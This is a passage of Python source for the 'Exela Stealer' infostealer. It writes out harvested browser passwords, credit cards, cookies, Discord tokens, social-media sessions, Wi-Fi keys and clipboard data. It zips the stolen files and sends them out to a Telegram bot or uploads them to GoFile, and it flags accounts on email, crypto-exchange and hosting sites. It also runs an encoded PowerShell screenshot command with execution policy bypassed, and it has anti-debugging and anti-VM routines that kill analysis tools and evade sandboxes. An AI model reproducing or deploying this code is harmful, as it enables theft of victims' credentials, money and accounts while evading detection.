AgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
            process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}",cwd=filePath,shell=True)
            await process.communicate() 
            password_list = Variables.Passwords
            card_list = Variables.Cards
            cookie_list = Variables.Cookies
            history_list = Variables.Historys
            bookmark_list = Variables.Bookmarks
            autofill_list = Variables.Autofills
            download_list = Variables.Downloads
            riot_acc = Variables.RiotGameAccounts
            insta_acc = Variables.InstagramAccounts
            twitter_acc = Variables.TwitterAccounts
            tiktok_acc = Variables.TikTokAccounts
            reddit_acc = Variables.RedditAccounts
            twitch_acc = Variables.TwtichAccounts
            spotify_acc = Variables.SpotifyAccounts
            roblox_acc = Variables.RobloxAccounts

            processList = Variables.Processes
            if processList:
                with open(os.path.join(filePath, "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for proc in processList:
                        file.write(proc)
            if Variables.ClipBoard:
                with open(os.path.join(filePath, "last_clipboard.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for lstclip in Variables.ClipBoard:
                        file.write(lstclip)
            if self.FirefoxCookieList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for fcookie in self.FirefoxCookieList:
                        file.write(fcookie)
            if self.FirefoxHistoryList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "History.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for fhistory in self.FirefoxHistoryList:
                        file.write(fhistory)
            if self.FirefoxAutofiList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for fautofill in self.FirefoxAutofiList:
                        file.write(fautofill)
            if password_list:
                with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for passwords in password_list:
                        file.write(passwords)
            if card_list:
                with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for cards in card_list:
                        file.write(cards)
            if cookie_list:
                with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for cookies in cookie_list:
                        file.write(cookies)
            if history_list:
                with open(os.path.join(filePath, "Browsers", "Historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for historys in history_list:
                        file.write(historys)
            if autofill_list:
                with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for autofill in autofill_list:
                        file.write(autofill)
            if bookmark_list:
                with open(os.path.join(filePath, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for bookmark in bookmark_list:
                        file.write(bookmark)           
            if download_list:
                with open(os.path.join(filePath, "Browsers", "Downloads.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for downloads in download_list:
                        file.write(downloads)
            if riot_acc:
                with open(os.path.join(filePath, "Sessions", "riot_games.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for riotgames in riot_acc:
                        file.write(riotgames)
            if insta_acc:
                with open(os.path.join(filePath, "Sessions", "instagram_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for insta in insta_acc:
                        file.write(insta)
            if tiktok_acc:
                with open(os.path.join(filePath, "Sessions", "tiktok_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for tiktok in tiktok_acc:
                        file.write(tiktok)
            if twitter_acc:
                with open(os.path.join(filePath, "Sessions", "twitter_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for twitter in twitter_acc:
                        file.write(twitter)
            if reddit_acc:
                with open(os.path.join(filePath, "Sessions", "reddit_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for reddit in reddit_acc:
                        file.write(reddit)
            if twitch_acc:
                with open(os.path.join(filePath, "Sessions", "twitch_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for twitch in twitch_acc:
                        file.write(twitch)
            if spotify_acc:
                with open(os.path.join(filePath, "Sessions", "spotify_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for spotify in spotify_acc:
                        file.write(spotify)
            if roblox_acc:
                with open(os.path.join(filePath, "Sessions", "roblox_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for roblox in roblox_acc:
                        file.write(roblox)
            if Variables.DiscordAccounts:
                with open(os.path.join(filePath, "Tokens", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for discord in Variables.DiscordAccounts:
                        file.write(discord)
            if Variables.FullTokens:
                with open(os.path.join(filePath, "Tokens", "full_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for token in Variables.FullTokens:
                        file.write(token + "\n")    
            if Variables.ValidatedTokens:
                with open(os.path.join(filePath, "Tokens", "validated_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for validated_token in Variables.ValidatedTokens:
                        file.write(validated_token + "\n")   
            if Variables.Wifis:
                with open(os.path.join(filePath, "wifi_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for profile_name, profile_password in Variables.Wifis:
                        file.write(f"WiFi Profile: {str(profile_name)}\nPassword: {str(profile_password)}\n\n")
            if Variables.SystemInfo:
                with open(os.path.join(filePath, "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for sysmteminfo in Variables.SystemInfo:
                        file.write(str(sysmteminfo))
            if Variables.Network:
                with open(os.path.join(filePath, "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("=" * 70 + "\n")
                    for ip, country, city, timezone, isp, proxy in Variables.Network:
                        file.write(f"IP Adress: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp}\nProxy: {proxy}") 
            if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Sessions"))
                except:pass
            if len(os.listdir(os.path.join(filePath, "Tokens"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Tokens"))
                except:pass
            if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
                try:
                    shutil.rmtree(os.path.join(filePath, "Browsers"))
                except:pass
        except:pass

    async def SendContains(self) -> None:
        try:
            cookie_keys = ""
            password_keys = ""
            autofill_keys = ""
            keywords = ["gmail.com", "live.com", "zoho.com", "tutanota.com", "trashmail.com", "gmx.net", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase.com", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "ekool.eu", "steamcommunity.com", "epicgames.com", "0x00sec.org", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io","nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "play.tv3.ee", ".ope.ee", "astolfo.lgbt", "intent.store", "novoline.wtf","flux.today", "moonx.gg", "novoline.lol", "twitch.tv"]
            for c in keywords:
                found_autofill = False
                found_passw = False
                found_cookie = False
                for auts in Variables.Autofills:
                    if c in auts:
                        found_autofill = True
                        break

                for pssw in Variables.Passwords:
                    if c in pssw:
                        found_passw = True
                        break

                for cooks in Variables.Cookies:
                    if c in cooks:
                        found_cookie = True
                        break

                if found_autofill:
                    autofill_keys += c + ", "

                if found_passw:
                    password_keys += c + ", "

                if found_cookie:
                    cookie_keys += c + ", "
            if not cookie_keys:
                cookie_keys = None
            if not password_keys:
                password_keys = None
            if not autofill_keys:
                autofill_keys = None

            send_info = f"""
<b>📚 <i><u>Keyword Result</u></i></b>

<b>Passwords:</b>\n {password_keys}
<b>Autofills:</b>\n {autofill_keys}
<b>Cookies:</b>\n {cookie_keys}

<b>👤 <i><u>About - https://t.me/Exela_Stealer</u></i></b>
"""
            await bot.send_message(chat_id=chat_id, text=send_info, parse_mode='HTML')
        except Exception as e:
            print(f'send contains error {str(e)}')

    async def SendAllData(self) -> None:
        try:
            cmd = "wmic csproduct get uuid"
            process = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    shell=True
                )
                
            stdout, stderr = await process.communicate()
            output_lines = stdout.decode(errors="ignore").split("\n")
            uuid = output_lines[1].strip() if len(output_lines) > 1 else "NONE"
            filePath: str = os.path.join(self.Temp, uuid)
            
            # Créer l'archive zip de manière asynchrone
            await asyncio.to_thread(shutil.make_archive, filePath, "zip", filePath)

            send_info = f"""
<b>💻 <i><u>Exela Stealer - Browsers Count</u></i></b>

<b>Password</b> <code>{str(len(Variables.Passwords))}</code>
<b>Card</b> <code>{str(len(Variables.Cards))}</code>
<b>Cookie</b>  <code>{str(len(Variables.Cookies) + len(self.FirefoxCookieList))}</code>
<b>History</b> <code>{str(len(Variables.Historys) + len(self.FirefoxHistoryList))}</code>
<b>Download</b> <code>{str(len(Variables.Downloads))}</code>
<b>Bookmark</b> <code>{str(len(Variables.Bookmarks))}</code>
<b>Autofill</b> <code>{str(len(Variables.Autofills) + len(self.FirefoxAutofiList))}</code>
<b>FireFox?</b> <code>{str(self.FireFox)}</code>

<b>🎮 <i><u>Exela Stealer - Sessions Count</u></i></b>

<b>Tokens</b> <code>{str(len(Variables.FullTokens))}</code>
<b>Instagram</b> <code>{str(len(Variables.InstagramAccounts))}</code>
<b>Twitter</b> <code>{str(len(Variables.TwitterAccounts))}</code>
<b>TikTok</b> <code>{str(len(Variables.TikTokAccounts))}</code>
<b>Twitch</b> <code>{str(len(Variables.TwtichAccounts))}</code>
<b>Reddit</b> <code>{str(len(Variables.RedditAccounts))}</code>
<b>Spotify</b> <code>{str(len(Variables.SpotifyAccounts))}</code>
<b>Riot Game's</b> <code>{str(len(Variables.RiotGameAccounts))}</code>
<b>Roblox</b> <code>{str(len(Variables.RobloxAccounts))}</code>

<b>👤 <i><u>About - https://t.me/Exela_Stealer</u></i></b>
"""
            await bot.send_message(chat_id=chat_id, text=send_info, parse_mode='HTML')
            
            await self.SendContains()
            
            zip_file_path = filePath + ".zip"
            if not os.path.getsize(zip_file_path) / (1024 * 1024) > 15:
                with open(zip_file_path, 'rb') as file:
                    await bot.send_document(chat_id, document=InputFile(file))
                    pass
            else:
                success = await UploadGoFile.upload_file(zip_file_path)
                if success is not None:
                    send_info = f"""
<b>📦 <i><u>Exela Stealer - Full Info</u></i></b>

<b><i>Download Link:</i></b> <a href="{success}"><b><u>{uuid}.zip</u></b></a>

<b>👤 <i><u>About - https://t.me/Exela_Stealer</u></i></b>
"""
                    await bot.send_message(chat_id=chat_id, text=send_info, parse_mode='HTML')
                else:
                    print("file cannot be uploaded to GoFile.")
            
            try:
                os.remove(zip_file_path)
                shutil.rmtree(filePath)
            except Exception as e:
                print(f'Error while removing files: {str(e)}')
        except Exception as e:
            error_Handler(e)
    
class UploadGoFile:
    @staticmethod
    async def GetServer() -> str:
        try:
            response = requests.get("https://api.gofile.io/getServer")
            data = response.json()
            return data["data"]["server"]
        except Exception as e:
            print(f"An error occurred while getting server: '{e}'\nit will use default server (store1).")
            return "store1"

    @staticmethod
    async def upload_file(file_path: str) -> str:
        try:
            ActiveServer = await UploadGoFile.GetServer()
            upload_url = f"https://{ActiveServer}.gofile.io/uploadFile"
            
            with open(file_path, 'rb') as file:
                files = {'file': (os.path.basename(file_path), file)}
                response = requests.post(upload_url, files=files)
                response_body = response.text

                raw_json = json.loads(response_body)
                download_page = raw_json['data']['downloadPage']
                return download_page
        except Exception as e:
            print(f"An error occurred during file upload: '{e}'")
            return None
        
class AntiDebug:
    def __init__(self) -> None:
        self.banned_uuids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","7204B444-B03C-48BA-A40F-0D1FE2E4A03B","88F1A492-340E-47C7-B017-AAB2D6F6976C","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                            "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]
        self.banned_computer_names = ["WDAGUtilityAccount","Harry Johnson","JOANNA","WINZDS-21T43RNG", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                            "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                            "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
        self.banned_process = ["HTTP Toolkit.exe", "httpdebuggerui.exe","wireshark.exe", "fiddler.exe", "regedit.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe",
                                     "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]

    async def FunctionRunner(self):
        print("[+] Anti Debugging Started.")
        taskk = [asyncio.create_task(self.check_system()),
                 asyncio.create_task(self.kill_process())]
        await asyncio.gather(*taskk)
        print(f"[+] Anti Debug Succesfully Executed.")
    async def check_system(self) -> None:
        cmd = "wmic csproduct get uuid"
        process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
        stdout, stderr = await process.communicate()
        output_lines = stdout.decode(errors="ignore").split("\n")
        get_uuid = output_lines[1].strip()
        get_computer_name = os.getenv("computername")    
        
        for uuid in self.banned_uuids:
            if uuid in get_uuid:
                print("hwid detected")
                os._exit(0)
        
        for compName in self.banned_computer_names:
            if compName in get_computer_name:
                print("computer name detected")
                os._exit(0)

    async def kill_process(self) -> None:
        try:
            process_list = await asyncio.create_subprocess_shell(
                'tasklist',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            
            stdout, _ = await process_list.communicate()
            stdout = stdout.decode(errors="ignore")
            for proc in self.banned_process:
                if proc.lower() in stdout.lower():
                    process_list = await asyncio.create_subprocess_shell(
                    f'taskkill /F /IM "{proc}"',
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    shell=True)

                    await process_list.communicate()
        except:
            pass

class AntiVM:
    async def FunctionRunner(self) -> None:
        print("Anti-VM started.")
        taskk = [
            asyncio.create_task(self.CheckGpu()),
            asyncio.create_task(self.CheckHypervisor()),
            asyncio.create_task(self.CheckHostName()),
            asyncio.create_task(self.CheckDisk()),
            asyncio.create_task(self.CheckDLL()),
            asyncio.create_task(self.CheckGDB()),
            asyncio.create_task(self.CheckProcess()),]
        results = await asyncio.gather(*taskk)
        if any(results):
            print("Anti-VM executed sucesffuly, detected VM machines.")
            try:
                os._exit(0)
            except:
                try:
                    sys.exit(0)
                except:
                    try:
                        ctypes.windll.kernel32.ExitProcess(0)
                    except:
                        try:
                            exit(0)
                        except:
                            pass
        print("Anti-VM executed sucesffuly, do not detected VM machines.")
    async def CheckGpu(self) -> bool:
        try:
            command_output = await asyncio.create_subprocess_shell(
                'wmic path win32_VideoController get name',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
            stdout, stderr = await command_output.communicate()
            decoded_output = stdout.decode(errors='ignore').splitlines()
            return any(x.lower() in decoded_output[2].strip().lower() for x in ("virtualbox", "vmware"))
        except:
            return False
    async def CheckHostName(self) -> bool:
        try:
            hostNames = ['sandbox','cuckoo', 'vm', 'virtual', 'qemu', 'vbox', 'xen']
            hostname = platform.node().lower()
            for name in hostNames:
                if name in hostname:
                    return True
            return False
        except:
            return False
    async def CheckDisk(self) -> bool:
        try:
            return any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        except:
            return False
    async def CheckDLL(self) -> bool:
        try:
            handle = ctypes.windll.LoadLibrary("SbieDll.dll")
        except:
            return False
        else:
            return True
    async def CheckGDB(self) -> bool:
        try:
            process = await asyncio.create_subprocess_shell(
                "gdb --version",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
            stdout, stderr = await process.communicate()
            if b"GDB" in stdout:
                return True
        except:
            return False
    async def CheckProcess(self) -> bool:
        try:
            banned_processes = [
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "vmacthlp.exe",
            "vboxtray.exe",
            "vboxservice.exe",
            "vmsrvc.exe",
            "prl_tools.exe",
            "xenservice.exe",
                            ]           
            process = await asyncio.create_subprocess_shell("tasklist",stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout, stderr = await process.communicate()
            result = stdout.decode().lower()
            for process in banned_processes:
                if process in result:
                    return True
            return False
        except:
            return False
    async def CheckHypervisor(self) -> bool:
        try:
            output = await asyncio.create_subprocess_shell(
                'wmic computersystem get Manufacturer',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await output.communicate()

            output2 = await asyncio.create_subprocess_shell(
                'wmic path Win32_ComputerSystem get Manufacturer',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout2, stderr2 = await output2.communicate()

            
            if b'VMware' in stdout:
                return True
            elif b"vmware" in stdout2.lower():
                return True
        except:
            return False


if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("Exela | Stealar | on top |"):
            print("mutex already exist")
            os._exit(0)
        else:
            start_time = time.time()
            if Anti_VM:
                asyncio.run(AntiVM().FunctionRunner())
            asyncio.run(AntiDebug().FunctionRunner())
            main_instance = Main()
            asyncio.run(main_instance.FunctionRunner())

            print(f"\nThe code executed on: {str(time.time() - start_time)} second", end="")
    else:
        print("just Windows Operating system's supported by Exela")
